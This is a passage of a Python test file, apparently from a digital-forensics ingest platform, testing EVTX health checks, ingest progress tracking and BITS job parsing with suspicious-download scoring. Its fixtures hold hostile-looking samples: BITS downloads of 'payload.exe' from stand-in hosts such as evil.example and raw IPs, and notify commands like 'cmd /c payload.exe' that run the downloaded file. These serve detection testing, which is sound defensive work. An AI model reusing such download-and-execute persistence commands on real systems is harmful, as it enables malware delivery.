    assert item["accepted_at"] == "2026-05-23T11:00:00Z"


def test_run_evtx_health_check_missing_file_returns_file_missing(tmp_path: Path) -> None:
    result = run_evtx_health_check(tmp_path / "missing.evtx")

    assert result["exists"] is False
    assert result["diagnosis"] == "file_missing"
    assert result["retry_recommended"] is False


def test_run_evtx_health_check_invalid_header_returns_corrupt_header(tmp_path: Path) -> None:
    artifact = tmp_path / "broken.evtx"
    artifact.write_bytes(b"not-an-evtx")

    result = run_evtx_health_check(artifact)

    assert result["exists"] is True
    assert result["corrupt_header"] is True
    assert result["diagnosis"] == "corrupt_header"
    assert result["likely_corrupt"] is True


def test_run_evtx_health_check_timeout_during_iteration_returns_timeout(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    artifact = tmp_path / "slow.evtx"
    artifact.write_bytes(b"ElfFile\x00" + b"\x00" * 4096)

    def _fake_iter(*args, **kwargs):  # noqa: ANN002, ANN003
        raise TimeoutError("slow iteration")
        yield  # pragma: no cover

    monkeypatch.setattr("app.ingest.raw_parsers.evtx_parser.iter_evtx_xml_record_results", _fake_iter)

    result = run_evtx_health_check(artifact)

    assert result["evtx_header_valid"] is True
    assert result["timed_out"] is True
    assert result["diagnosis"] == "valid_header_but_record_iteration_timeout"
    assert result["retry_recommended"] is True


def test_problematic_artifact_importance_marks_attack_samples_high() -> None:
    importance, reasons = score_problematic_artifact_importance(
        {
            "name": "etw_rpc_zerologon.evtx",
            "source_path": "Windows/System32/winevt/Logs/etw_rpc_zerologon.evtx",
            "parser": "evtx_raw",
            "records_read": 2500,
            "records_indexed": 1200,
            "data_loss_expected": True,
        }
    )
    assert importance == "high"
    assert "attack_sample_name" in reasons


def test_problematic_artifacts_require_error_status_ignores_resolved_retry_warning() -> None:
    report = {
        "summary": {"problematic_count": 1},
        "items": [
            {
                "name": "etw_rpc_zerologon.evtx",
                "status": "skipped_timeout",
                "data_loss_expected": True,
                "retry_history": [
                    {
                        "status": "parsed_with_warning",
                        "records_read": 415,
                        "records_indexed": 415,
                        "outcome": "recovered_more_data",
                    }
                ],
            }
        ],
    }

    assert problematic_artifacts_require_error_status(report) is False


def test_retry_profile_safe_mode_disables_detections_and_raises_timeouts() -> None:
    profile = _resolve_retry_profile("safe_mode", None)

    assert profile["retry_mode"] == "safe_mode"
    assert profile["detections_enabled"] is False
    assert profile["parse_only"] is False
    assert profile["bulk_batch_size"] == 250
    assert profile["effective_timeouts"]["record_timeout_seconds"] >= 90


def test_retry_profile_deep_safe_mode_uses_higher_timeout_and_caps_runtime() -> None:
    profile = _resolve_retry_profile("deep_safe_mode", None)

    assert profile["retry_mode"] == "deep_safe_mode"
    assert profile["detections_enabled"] is False
    assert profile["parse_only"] is False
    assert profile["bulk_batch_size"] == 100
    assert profile["max_artifact_seconds"] == 600
    assert profile["effective_timeouts"]["record_timeout_seconds"] >= 300


def test_ingest_run_sync_copies_progress_fields() -> None:
    metadata = start_ingest_run({}, run_id="run-1", run_type="reprocess", mode="previous_selection", status="queued")
    metadata.update(
        {
            "current_phase": "parsing",
            "progress_pct": 42,
            "current_artifact": "Security.evtx",
            "current_artifact_progress_label": "300 records read / 300 indexed",
            "artifacts_total": 10,
            "artifacts_done": 4,
            "artifacts_failed": 1,
            "current_artifact_records_read": 300,
            "current_artifact_records_indexed": 300,
            "events_indexed": 900,
            "records_per_second": 25.5,
            "heartbeat_at": "2026-05-22T10:00:00Z",
        }
    )

    synced = sync_ingest_run_from_metadata(metadata, run_id="run-1", ingest_status="processing")
    run = synced["ingest_runs"][0]

    assert run["status"] == "processing"
    assert run["phase"] == "parsing"
    assert run["progress"] == 42
    assert run["current_artifact"] == "Security.evtx"
    assert run["artifact_progress"] == "300 records read / 300 indexed"
    assert run["records_read"] == 300
    assert run["records_indexed"] == 300


def test_sync_ingest_run_prefers_parallel_running_artifact_summary() -> None:
    metadata = start_ingest_run({}, run_id="run-1", run_type="reprocess", mode="previous_selection", status="queued")
    metadata.update(
        {
            "current_phase": "parsing",
            "current_artifact": "Shimcache raw - SYSTEM",
            "current_artifact_path": "Windows/System32/config/SYSTEM",
            "current_artifact_progress_label": "stale",
            "tail_records_read": 4000,
            "tail_records_indexed": 2000,
            "parallel_ingest": {
                "running_artifacts": [
                    {
                        "artifact": "EVTX raw - Security.evtx",
                        "source_path": "Windows/System32/winevt/Logs/Security.evtx",
                        "records_read": 4000,
                        "records_indexed": 2000,
                    }
                ]
            },
        }
    )

    synced = sync_ingest_run_from_metadata(metadata, run_id="run-1", ingest_status="processing")
    run = synced["ingest_runs"][0]

    assert run["current_artifact"] == "Windows/System32/winevt/Logs/Security.evtx"
    assert run["current_artifact_source"] == "parallel_running_artifacts"
    assert run["artifact_progress"] == "EVTX raw - Security.evtx · 4000 records read / 2000 indexed"


def test_sync_ingest_run_summarizes_multiple_parallel_artifacts() -> None:
    metadata = start_ingest_run({}, run_id="run-1", run_type="reprocess", mode="previous_selection", status="queued")
    metadata.update(
        {
            "current_phase": "parsing",
            "tail_records_read": 6000,
            "tail_records_indexed": 4000,
            "parallel_ingest": {
                "running_artifacts": [
                    {"artifact": "EVTX raw - Security.evtx", "records_read": 2000, "records_indexed": 2000},
                    {"artifact": "EVTX raw - System.evtx", "records_read": 2000, "records_indexed": 1000},
                ]
            },
        }
    )

    synced = sync_ingest_run_from_metadata(metadata, run_id="run-1", ingest_status="processing")
    run = synced["ingest_runs"][0]

    assert run["current_artifact"] == "Multiple artifacts running"
    assert run["current_artifact_source"] == "parallel_running_artifacts"
    assert run["artifact_progress"] == "2 artifacts active · 6000 records read / 4000 indexed"


def test_sync_ingest_run_clears_stale_current_artifact_fields_when_terminal() -> None:
    metadata = start_ingest_run({}, run_id="run-1", run_type="reprocess", mode="previous_selection", status="queued")
    metadata.update(
        {
            "current_phase": "completed",
            "current_artifact": "Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx",
            "current_artifact_path": "Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx",
            "current_artifact_progress_label": "EVTX raw - Microsoft-Windows-PowerShell%4Operational.evtx · 22050 records read / 22000 indexed",
            "parallel_ingest": {"running_artifacts": []},
            "tail_current_artifacts": [],
            "events_indexed": 58512,
            "records_processed": 58516,
        }
    )

    synced = sync_ingest_run_from_metadata(metadata, run_id="run-1", ingest_status="completed")
    run = synced["ingest_runs"][0]

    assert run["status"] == "completed"
    assert run["current_artifact"] is None
    assert run["current_artifact_source"] is None
    assert run["artifact_progress"] is None


def test_sync_ingest_run_normalizes_enum_like_terminal_status() -> None:
    metadata = start_ingest_run({}, run_id="run-1", run_type="reprocess", mode="previous_selection", status="queued")
    metadata.update(
        {
            "current_phase": "completed",
            "current_artifact": "Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx",
            "current_artifact_progress_label": "stale",
        }
    )

    synced = sync_ingest_run_from_metadata(metadata, run_id="run-1", ingest_status="IngestStatus.COMPLETED")
    run = synced["ingest_runs"][0]

    assert run["status"] == "completed"
    assert run["current_artifact"] is None
    assert run["current_artifact_source"] is None
    assert run["artifact_progress"] is None


def test_build_ingest_coverage_comparison_report_compares_latest_and_previous_runs() -> None:
    case = SimpleNamespace(id="case-1")
    evidence = SimpleNamespace(
        id="evidence-1",
        metadata_json={
            "ingest_runs": [
                {"run_id": "old-run", "status": "completed_with_errors", "events_indexed": 27011, "artifacts_failed": 10, "finished_at": "2026-05-25T13:12:53Z"},
                {"run_id": "new-run", "status": "processing", "events_indexed": 29011, "artifacts_failed": 0, "finished_at": "2026-05-25T15:00:00Z"},
            ],
            "latest_ingest_run_id": "new-run",
        },
    )

    report = _build_ingest_coverage_comparison_report(
        _DebugPackContext(case=case, evidences=[evidence], request=SimpleNamespace(), export_timestamp=datetime.now(UTC)),
        problematic_artifacts_report={"items": [{"artifact_id": "a1", "name": "Security.evtx", "status": "failed_aborted", "effective_status": "failed_aborted", "retryable": True}]},
    )

    assert report["previous_run_id"] == "old-run"
    assert report["current_run_id"] == "new-run"
    assert report["old_events_indexed"] == 27011
    assert report["new_events_indexed"] == 29011
    assert report["delta"] == 2000
    assert report["artifacts_still_missing"][0]["name"] == "Security.evtx"


def test_start_ingest_run_sets_current_id_and_created_at() -> None:
    metadata = start_ingest_run({}, run_id="ingest-run-1", run_type="reprocess", mode="previous_selection", status="queued")

    assert metadata["current_ingest_run_id"] == "ingest-run-1"
    assert metadata["ingest_runs"][0]["run_id"] == "ingest-run-1"
    assert metadata["ingest_runs"][0]["created_at"]
    assert metadata["error_log"] == {}


def test_sync_ingest_run_clears_stale_last_error_while_processing() -> None:
    metadata = start_ingest_run({"error_log": {"fatal": "old timeout"}}, run_id="ingest-run-1", run_type="reprocess", mode="previous_selection", status="queued")
    metadata["ingest_runs"][0]["last_error"] = "old timeout"
    metadata.update(
        {
            "current_phase": "materializing_and_parsing",
            "progress_pct": 35,
            "heartbeat_at": "2026-05-24T17:30:00Z",
        }
    )

    synced = sync_ingest_run_from_metadata(metadata, run_id="ingest-run-1", ingest_status="processing")

    assert synced["ingest_runs"][0]["last_error"] is None


def test_start_ingest_run_resets_stale_tail_and_current_artifact_state() -> None:
    metadata = start_ingest_run(
        {
            "current_phase": "worker_lost_reconciled",
            "current_action": "worker_lost_reconciled",
            "current_artifact": "Shimcache raw - SYSTEM",
            "current_artifact_source": "stale_fallback",
            "tail_artifacts_total": 9,
            "tail_artifacts_running": 4,
            "tail_artifacts_queued": 5,
            "tail_last_progress_at": "2026-05-25T15:27:58+00:00",
        },
        run_id="ingest-run-2",
        run_type="reprocess",
        mode="previous_selection",
        status="queued",
    )

    assert metadata["current_ingest_run_id"] == "ingest-run-2"
    assert metadata["current_phase"] == "queued"
    assert metadata["current_action"] is None
    assert metadata["current_artifact"] is None
    assert metadata["current_artifact_source"] is None
    assert metadata["tail_artifacts_total"] == 0
    assert metadata["tail_artifacts_running"] == 0
    assert metadata["tail_artifacts_queued"] == 0
    assert metadata["tail_last_progress_at"] is None


def test_problematic_artifacts_report_resolves_artifact_id_by_name_fallback() -> None:
    evidence = SimpleNamespace(id="evidence-1", metadata_json={})
    manifest = {
        "artifacts": [
            {
                "name": "EVTX raw - bits_openvpn.evtx",
                "source_path": "Uploads/Auto/bits_openvpn.evtx",
                "artifact_type": "evtx_raw",
                "parser": "evtx_raw",
                "status": "failed",
                "ingest_audit": {"records_read": 1000, "records_indexed": 1000},
            }
        ],
        "errors": [{"artifact": "EVTX raw - bits_openvpn.evtx", "error": "timed out after 45s"}],
    }

    report = build_problematic_artifacts_report(
        evidence,
        manifest,
        artifact_id_by_key={("EVTX raw - bits_openvpn.evtx", ""): "artifact-123"},
    )

    assert report["items"][0]["artifact_id"] == "artifact-123"


def test_merge_evidence_metadata_preserves_artifact_retry_runs() -> None:
    existing = {
        "artifact_retry_runs": [
            {"run_id": "retry-1", "status": "failed", "mode": "safe_mode"},
        ],
        "ingest_runs": [{"run_id": "ingest-1", "status": "failed"}],
    }
    patch = {
        "current_ingest_run_id": "ingest-2",
        "ingest_runs": [{"run_id": "ingest-2", "status": "queued"}],
    }

    merged = merge_evidence_metadata(existing, patch)

    assert len(merged["artifact_retry_runs"]) == 1
    assert merged["artifact_retry_runs"][0]["run_id"] == "retry-1"
    assert {item["run_id"] for item in merged["ingest_runs"]} == {"ingest-1", "ingest-2"}


def test_sync_ingest_run_update_does_not_drop_artifact_retry_runs() -> None:
    metadata = {
        "artifact_retry_runs": [{"run_id": "retry-1", "status": "failed"}],
    }
    metadata = start_ingest_run(metadata, run_id="ingest-1", run_type="reprocess", mode="previous_selection", status="queued")
    metadata.update(
        {
            "current_phase": "extracting_selected",
            "progress_pct": 30,
            "heartbeat_at": "2026-05-22T10:00:00Z",
        }
    )
    synced = sync_ingest_run_from_metadata(metadata, run_id="ingest-1", ingest_status="processing")
    merged = merge_evidence_metadata(metadata, synced)

    assert len(merged["artifact_retry_runs"]) == 1
    assert merged["artifact_retry_runs"][0]["run_id"] == "retry-1"
    assert len(merged["ingest_runs"]) == 1
    assert merged["ingest_runs"][0]["run_id"] == "ingest-1"


def test_rebuild_ingest_plan_from_last_run_preserves_artifact_retry_runs(sqlite_session) -> None:
    case = Case(id="case-1", name="Case 1", status=CaseStatus.open)
    evidence = Evidence(
        id="evidence-1",
        case_id=case.id,
        original_filename="sample.zip",
        stored_path="/tmp/sample.zip",
        original_path="/tmp/sample.zip",
        storage_mode=EvidenceStorageMode.uploaded,
        is_external=False,
        copy_to_storage=True,
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="sha",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={
            "artifact_retry_runs": [{"run_id": "retry-1", "status": "failed"}],
            "velociraptor_discovery": {
                "candidates": [
                    {
                        "id": "cand-1",
                        "original_path": "A.evtx",
                        "artifact_type": "evtx_raw",
                        "parser": "evtx_raw",
                        "supported": True,
                    }
                ]
            },
        },
        path_validation={},
        ingest_source={},
        error_log={},
    )
    artifact = Artifact(
        id="artifact-1",
        case_id=case.id,
        evidence_id=evidence.id,
        name="EVTX raw - A.evtx",
        artifact_type="evtx_raw",
        parser="evtx_raw",
        source_path="A.evtx",
        status="completed",
        record_count=10,
    )
    sqlite_session.add(case)
    sqlite_session.add(evidence)
    sqlite_session.add(artifact)
    sqlite_session.commit()

    rebuilt = rebuild_ingest_plan_from_last_run(sqlite_session, evidence, dict(evidence.metadata_json or {}), persist=True)
    sqlite_session.refresh(evidence)

    assert rebuilt is not None
    assert (evidence.metadata_json or {}).get("artifact_retry_runs")
    assert (evidence.metadata_json or {})["artifact_retry_runs"][0]["run_id"] == "retry-1"


def test_evtx_artifact_progress_callback_preserves_indexed_counts_and_times_out(monkeypatch: pytest.MonkeyPatch) -> None:
    updates: list[dict] = []

    def fake_update(evidence_id: str, *, phase: str, progress_pct: int, phases=None, extra=None) -> None:
        updates.append({"evidence_id": evidence_id, "phase": phase, "progress_pct": progress_pct, "extra": dict(extra or {})})

    monkeypatch.setattr("app.workers.tasks._update_progress_isolated", fake_update)
    monkeypatch.setattr("app.workers.tasks.settings.evtx_artifact_max_seconds", 1)
    callback = _artifact_progress_callback(
        evidence_id="ev-1",
        artifact_name="slow.evtx",
        artifact_index=2,
        total_artifacts=10,
        artifacts_processed=1,
        indexed_count=100,
        records_processed=100,
        detection_count=0,
        raw_artifacts_detected=10,
        raw_artifacts_not_parsed=0,
        started_monotonic=time.perf_counter() - 5,
        state={
            "artifact_started_monotonic": time.perf_counter() - 5,
            "records_indexed_in_artifact": 25,
            "events_indexed_total": 125,
            "records_processed_total": 125,
        },
    )
    with pytest.raises(TimeoutError):
        callback({"records_read": 250, "events_buffered": 10, "errors_count": 0})
    assert updates
    extra = updates[-1]["extra"]
    assert extra["events_indexed"] == 125
    assert extra["current_artifact_records_indexed"] == 25
    assert extra["current_artifact_pending_index_records"] == 225
    assert extra["current_artifact_is_slow"] is True


def test_evtx_record_timeout_raises_timeout() -> None:
    started = time.monotonic()
    with pytest.raises(TimeoutError, match="timed out"):
        with _evtx_record_timeout(1):
            time.sleep(2)
    assert time.monotonic() - started < 2


def test_artifact_classification_bits_does_not_misclassify_qmgr_sidecar() -> None:
    result = classify_artifact(Path("qmgr.jfm"), ["HeaderA", "HeaderB"])
    assert result["artifact_type"] != "bits"


def test_velociraptor_discovery_detects_bits_raw_and_evtx() -> None:
    root = Path(__file__).parent / "fixtures" / "bits" / "velociraptor_collection_bits"
    discovery = discover_velociraptor_evidences(root)
    bits_candidates = [item for item in discovery.candidates if item.category == "bits"]
    assert len(bits_candidates) >= 4
    qmgr0 = next(item for item in bits_candidates if item.normalized_windows_path == "C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr0.dat")
    qmgr1 = next(item for item in bits_candidates if item.normalized_windows_path == "C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr1.dat")
    qmgrdb = next(item for item in bits_candidates if item.normalized_windows_path == "C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db")
    evtx = next(item for item in bits_candidates if item.artifact_type == "bits_evtx")
    assert qmgr0.supported is False
    assert qmgr0.parser_status == "detected_not_implemented"
    assert qmgr0.parser == "bits_qmgr"
    assert qmgr1.artifact_type == "bits_qmgr_dat"
    assert qmgrdb.artifact_type == "bits_qmgr_db"
    assert qmgrdb.parser_status == "detected_not_implemented"
    assert qmgrdb.parser == "bits_qmgr"
    assert qmgrdb.reason == "BITS qmgr raw database detected. Raw qmgr parsing is not implemented yet."
    assert evtx.parser_status == "handled_by_evtx_parser"
    assert evtx.parser == "evtx"
    assert evtx.reason == "BITS EVTX found; handled by EVTX parser."


def test_bits_evidence_detail_shows_explanatory_message_when_only_raw_and_evtx_exist() -> None:
    evidence_detail_path = Path(__file__).resolve().parents[2] / "frontend" / "src" / "pages" / "EvidenceDetail.tsx"
    if not evidence_detail_path.exists():
        pytest.skip("frontend sources are not present in this test environment")
    evidence_detail = evidence_detail_path.read_text(encoding="utf-8")
    assert "No directly parseable BITS artifacts found. Raw qmgr parsing is not implemented yet; BITS EVTX artifacts are handled by the EVTX parser." in evidence_detail
    assert "No parseable {categoryLabel} artifacts found" not in evidence_detail


def test_normalize_bits_csv_file_extracts_expected_fields() -> None:
    source = Path(__file__).parent / "fixtures" / "bits" / "bits_jobs_sample.csv"
    docs = normalize_file(
        "case-1",
        "ev-bits",
        "art-bits",
        source,
        {
            "artifact_type": "bits",
            "parser": "bits_parser",
            "source_tool": "bits_parser",
            "source_format": "csv",
            "source_path": str(source),
            "name": source.name,
        },
    )
    assert len(docs) == 5
    benign = next(item for item in docs if item["bits"]["job_id"] == "job-winupdate")
    suspicious = next(item for item in docs if item["bits"]["job_id"] == "job-payload")
    notify = next(item for item in docs if item["bits"]["job_id"] == "job-notify")
    missing = next(item for item in docs if item["bits"]["job_id"] == "job-stale")
    assert benign["bits"]["remote_url"] == "https://download.windowsupdate.com/msdownload/update/software/updt/update.cab"
    assert benign["artifact"]["type"] == "bits"
    assert benign["artifact"]["parser"] == "bits_csv"
    assert benign["download"]["url"] == "https://download.windowsupdate.com/msdownload/update/software/updt/update.cab"
    assert benign["download"]["target_path"] == "C:\\Windows\\SoftwareDistribution\\Download\\update.cab"
    assert benign["download"]["file_name"] == "update.cab"
    assert benign["download"]["total_bytes"] == 1048576
    assert benign["download"]["received_bytes"] == 1048576
    assert benign["download"]["state"] == "complete"
    assert benign["risk_score"] == 0
    assert benign["persistence"]["mechanism"] is None
    assert benign["execution"]["is_execution_confirmed"] is False
    assert "suspicious_download" not in benign["tags"]
    assert suspicious["file"]["path"] == "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe"
    assert suspicious["download"]["url"] == "http://203.0.113.10/payload.exe"
    assert suspicious["download"]["target_path"] == "C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe"
    assert suspicious["download"]["file_name"] == "payload.exe"
    assert suspicious["network"]["domain"] == "203.0.113.10"
    assert suspicious["bits"]["state"] == "transferred"
    assert suspicious["event"]["type"] == "file_downloaded"
    assert suspicious["timestamp_precision"] == "bits_transfer_completion_time"
    assert "executable_download" in suspicious["tags"]
    assert suspicious["risk_score"] >= 50
    assert "BITS downloaded executable" in suspicious["suspicious_reasons"]
    assert "BITS download to user-writable path" in suspicious["suspicious_reasons"]
    assert "BITS download over HTTP" in suspicious["suspicious_reasons"]
    assert "BITS URL uses direct IP" in suspicious["suspicious_reasons"]
    assert "BITS owner is interactive user" in suspicious["suspicious_reasons"]
    assert notify["event"]["type"] == "file_downloaded"
    assert notify["download"]["url"] == "https://cdn.example.net/tools/runme.ps1"
    assert notify["download"]["target_path"] == "C:\\Users\\alex\\AppData\\Local\\Temp\\runme.ps1"
    assert notify["persistence"]["mechanism"] == "bits_notify_cmd"
    assert notify["process"]["name"] == "powershell.exe"
    assert "persistence" in notify["tags"]
    assert missing["bits"]["state"] == "suspended"
    assert missing["download"]["url"] is None
    assert missing["download"]["target_path"] is None
    assert missing["download"]["state"] == "interrupted"
    assert missing["timestamp_precision"] == "bits_modification_time"


def test_sanitize_event_keeps_bits_download_object() -> None:
    request = DebugExportRequest(case_id="case-1")
    sanitized = _sanitize_event(
        {
            "id": "bits-1",
            "artifact": {"type": "bits", "parser": "bits_csv"},
            "event": {"type": "file_downloaded"},
            "bits": {"job_id": "job-1", "remote_url": "https://evil.example/payload.exe"},
            "download": {
                "url": "https://evil.example/payload.exe",
                "target_path": "C:\\Users\\dfir\\AppData\\Local\\Temp\\payload.exe",
                "file_name": "payload.exe",
                "total_bytes": 1234,
                "received_bytes": 1234,
                "state": "complete",
            },
        },
        request,
    )
    assert sanitized["download"]["url"] == "https://evil.example/payload.exe"
    assert sanitized["download"]["target_path"] == "C:\\Users\\dfir\\AppData\\Local\\Temp\\payload.exe"
    assert sanitized["download"]["file_name"] == "payload.exe"


def test_normalize_bits_json_file_marks_script_temp_as_suspicious() -> None:
    source = Path(__file__).parent / "fixtures" / "bits" / "bits_jobs_sample.json"
    docs = normalize_file(
        "case-1",
        "ev-bits-json",
        "art-bits-json",
        source,
        {
            "artifact_type": "bits",
            "parser": "bits_json",
            "source_tool": "bits_parser",
            "source_format": "json",
            "source_path": str(source),
            "name": source.name,
        },
    )
    script_doc = next(item for item in docs if item["bits"]["job_id"] == "job-json-script")
    assert script_doc["event"]["type"] == "file_downloaded"
    assert script_doc["file"]["extension"] == ".ps1"
    assert "script_download" in script_doc["tags"]
    assert "cleartext_http" in script_doc["tags"]
    assert script_doc["persistence"]["mechanism"] == "bits_notify_cmd"
    assert script_doc["risk_score"] >= 75


def test_normalize_bitsadmin_text_file() -> None:
    source = Path(__file__).parent / "fixtures" / "bits" / "bitsadmin_sample.txt"
    docs = normalize_file(
        "case-1",
        "ev-bitsadmin",
        "art-bitsadmin",
        source,
        {
            "artifact_type": "bits",
            "parser": "bits_raw",
            "source_tool": "bitsadmin",
            "source_format": "txt",
            "source_path": str(source),
            "name": source.name,
        },
    )
    assert len(docs) == 2
    notify_doc = next(item for item in docs if item["bits"]["job_id"] == "job-bitsadmin-notify")
    assert notify_doc["bits"]["notify_cmd_line"] == "cmd /c payload.exe"
    assert notify_doc["event"]["type"] == "file_downloaded"
    assert notify_doc["network"]["domain"] == "203.0.113.11"
    assert notify_doc["persistence"]["mechanism"] == "bits_notify_cmd"


def test_bits_job_without_url_or_local_path_keeps_data_quality_without_breaking(tmp_path: Path) -> None:
    source = tmp_path / "bits_missing.csv"
    source.write_text(
        "JobId,DisplayName,OwnerSID,State,CreationTime\njob-x,empty,S-1-5-21-1-2-3-1001,Suspended,2026-05-10T11:00:00+00:00\n",
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-missing",
        "art-missing",
        source,
        {
            "artifact_type": "bits",
            "parser": "bits_parser",
            "source_tool": "bits_parser",
            "source_format": "csv",
            "source_path": str(source),
            "name": source.name,
        },
    )
    assert len(docs) == 1
    assert docs[0]["bits"]["job_id"] == "job-x"
    assert docs[0]["bits"]["remote_url"] is None
    assert docs[0]["bits"]["local_path"] is None
    assert docs[0]["event"]["type"] == "bits_job_observed"
    assert "missing_remote_url" in docs[0]["data_quality"]
    assert "missing_local_path" in docs[0]["data_quality"]


def test_build_bits_parse_report_counts_sources_and_skips() -> None:
    parser_audit = [
        {
            "artifact_type": "bits",
            "parser_name": "bits_jsonl",
            "parser_status": "parsed_native",
            "source_file": r"C:\exports\bits_jobs_sample.jsonl",
            "records_read": 4,
            "records_parsed": 4,
            "records_indexed": 4,
            "records_failed": 0,
            "by_state": {"transferred": 3, "suspended": 1},
            "by_owner": {"SYSTEM": 1, "dfir": 3},
            "by_event_type": {"file_downloaded": 3, "bits_job_observed": 1},
            "by_domain": {"evil.example": 1},
            "by_extension": {".exe": 1},
            "sample_records": [{"source_file": r"C:\exports\bits_jobs_sample.jsonl", "job_id": "job-notify-jsonl"}],
            "parse_warnings": [],
            "parser_errors": [],
        },
        {
            "artifact_type": "bits",
            "parser_name": "bits_qmgr",
            "parser_status": "detected_not_implemented",
            "source_file": r"C:\ProgramData\Microsoft\Network\Downloader\qmgr0.dat",
            "records_read": 0,
            "records_parsed": 0,
            "records_indexed": 0,
            "records_failed": 0,
            "parse_warnings": ["unsupported_bits_qmgr_raw"],
            "parser_errors": [],
        },
    ]
    events = [
        {
            "artifact": {"type": "bits", "parser": "bits_jsonl", "source_path": r"C:\exports\bits_jobs_sample.jsonl"},
            "bits": {"artifact_type": "bits_job", "state": "transferred", "owner": "dfir", "source_file": r"C:\exports\bits_jobs_sample.jsonl", "notify_cmd_line": "powershell.exe -File run.ps1"},
            "event": {"type": "file_downloaded"},
            "file": {"extension": ".exe"},
            "download": {"state": "complete"},
            "network": {"domain": "evil.example"},
            "suspicious_reasons": ["BITS job has notify command"],
            "data_quality": ["bits_not_execution_proof"],
        }
    ]
    discovery_candidates = [
        {"category": "bits", "normalized_windows_path": r"C:\exports\bits_jobs_sample.jsonl"},
        {"category": "bits", "normalized_windows_path": r"C:\ProgramData\Microsoft\Network\Downloader\qmgr0.dat"},
    ]
    report = _build_bits_parse_report(parser_audit, discovery_candidates, events, selected_artifact_types=["bits"], scope="evidence")
    assert report["records_read"] == 4
    assert report["records_indexed"] == 4
    assert report["detected_bits_sources"] >= 2
    assert report["by_parser"]["bits_jsonl"] == 1
    assert report["by_artifact_type"]["bits_job"] == 1
    assert report["by_state"]["transferred"] >= 1
    assert report["by_event_type"]["file_downloaded"] >= 1
    assert report["notify_command_count"] >= 1
    assert report["skipped_files"]


def test_bits_suspicious_http_ip_temp_download_has_expected_reasons() -> None:
    row = {
        "JobId": "job-http-ip",
        "RemoteUrl": "http://185.10.10.10/payload.exe",
        "LocalPath": "C:\\Users\\dfir\\AppData\\Local\\Temp\\payload.exe",
        "State": "TRANSFERRED",
        "Owner": "dfir",
        "TransferCompletionTime": "2026-05-15T10:00:00Z",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "bits", "parser": "bits_jsonl", "source_path": "bits.jsonl", "source_format": "jsonl", "name": "bits.jsonl"})
    assert doc["event"]["type"] == "file_downloaded"
    assert doc["file"]["extension"] == ".exe"
    assert doc["download"]["state"] == "complete"
    assert doc["network"]["direction"] == "download"
    assert doc["risk_score"] >= 80
    assert "BITS downloaded executable" in doc["suspicious_reasons"]
    assert "BITS download to user-writable path" in doc["suspicious_reasons"]
    assert "BITS download over HTTP" in doc["suspicious_reasons"]
    assert "BITS URL uses direct IP" in doc["suspicious_reasons"]
    assert "BITS owner is interactive user" in doc["suspicious_reasons"]


def test_bits_notify_command_and_double_extension() -> None:
    row = {
        "JobId": "job-notify",
        "RemoteUrl": "https://example.com/invoice.pdf.exe",
        "LocalPath": "C:\\Users\\dfir\\Downloads\\invoice.pdf.exe",
        "NotifyCmdLine": "C:\\Users\\dfir\\Downloads\\invoice.pdf.exe",
        "State": "TRANSFERRED",
        "TransferCompletionTime": "2026-05-15T10:00:00Z",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "bits", "parser": "bits_json", "source_path": "bits.json", "source_format": "json", "name": "bits.json"})
    assert "BITS job has notify command" in doc["suspicious_reasons"]
    assert "BITS notify command may execute downloaded file" in doc["suspicious_reasons"]
    assert "BITS download has double extension" in doc["suspicious_reasons"]
    assert doc["risk_score"] >= 80
    assert doc["execution"]["is_execution_confirmed"] is False


def test_bits_multiple_files_collapsed_marks_data_quality() -> None:
    row = {
        "JobId": "job-multi",
        "RemoteUrl": "https://example.com/a.exe",
        "LocalPath": "C:\\Users\\dfir\\Downloads\\a.exe",
        "FileList": "https://example.com/a.exe -> C:\\Users\\dfir\\Downloads\\a.exe; https://example.com/b.exe -> C:\\Users\\dfir\\Downloads\\b.exe",
        "State": "TRANSFERRED",
    }
    doc = normalize_row("case-1", "ev-1", "art-1", row, {"artifact_type": "bits", "parser": "bits_csv", "source_path": "bits.csv", "source_format": "csv", "name": "bits.csv"})
    assert "bits_multiple_files_collapsed" in doc["data_quality"]


def test_normalize_bits_jsonl_and_readme_skip() -> None:
    base = Path(__file__).parent / "fixtures" / "bits"
    docs = normalize_file(
        "case-1",
        "ev-bits-jsonl",
        "art-bits-jsonl",
        base / "bits_jobs_sample.jsonl",
        {
            "artifact_type": "bits",
            "parser": "jsonl",
            "source_tool": "native_bits",
            "source_format": "jsonl",
            "source_path": str(base / "bits_jobs_sample.jsonl"),
            "name": "bits_jobs_sample.jsonl",
        },
    )
    assert len(docs) == 4
    assert all(doc["artifact"]["type"] == "bits" for doc in docs)
    assert all(doc["execution"]["is_execution_confirmed"] is False for doc in docs)
    benign = next(item for item in docs if item["bits"]["job_id"] == "job-winupdate-jsonl")
    suspicious = next(item for item in docs if item["bits"]["job_id"] == "job-payload-jsonl")
    notify = next(item for item in docs if item["bits"]["job_id"] == "job-notify-jsonl")
    missing = next(item for item in docs if item["bits"]["job_id"] == "job-stale-jsonl")
    assert benign["risk_score"] == 0
    assert benign["persistence"]["mechanism"] is None
    assert suspicious["risk_score"] >= 50
    assert suspicious["network"]["domain"] == "evil.example"
    assert notify["persistence"]["mechanism"] == "bits_notify_cmd"
    assert notify["bits"]["notify_cmd_line"]
    assert notify["risk_score"] >= 80
    assert missing["@timestamp"] is None
    assert missing["timestamp_precision"] == "unknown"
    assert "missing_timestamp" in missing["data_quality"]

    readme_meta = {
        "artifact_type": "document",
        "parser": "unsupported_text",
        "source_tool": "collection_metadata",
        "source_format": "text",
        "source_path": str(base / "README.txt"),
        "name": "README.txt",
    }
    readme_docs = normalize_file("case-1", "ev-bits-readme", "art-bits-readme", base / "README.txt", readme_meta)
    assert readme_docs == []
    assert readme_meta["ingest_audit"]["records_indexed"] == 0


def test_bits_semi_auto_sections_and_correlations(monkeypatch) -> None:
